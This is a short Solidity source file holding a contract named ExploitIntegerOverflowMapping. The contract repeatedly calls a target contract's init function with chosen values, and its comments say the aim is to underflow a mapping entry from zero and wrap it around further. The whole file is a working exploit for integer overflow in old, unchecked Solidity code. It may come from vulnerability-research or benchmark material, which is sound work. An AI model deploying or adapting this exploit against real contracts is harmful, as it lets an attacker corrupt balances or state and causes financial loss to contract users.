pragma solidity ^0.4.11;

interface ITarget {
    function init(uint256 k, uint256 v) external;
}

contract ExploitIntegerOverflowMapping {
    ITarget public target;

    constructor(address _target) public {
        target = ITarget(_target);
    }

    function exploit(uint256 key, uint256[] vs) public {
        // First call: underflows from 0 to (2^256 - v)
        target.init(key, vs[0]);

        // Subsequent calls cause further wraparound
        for (uint i = 1; i < vs.length; i++) {
            target.init(key, vs[i]);
        }
    }
}

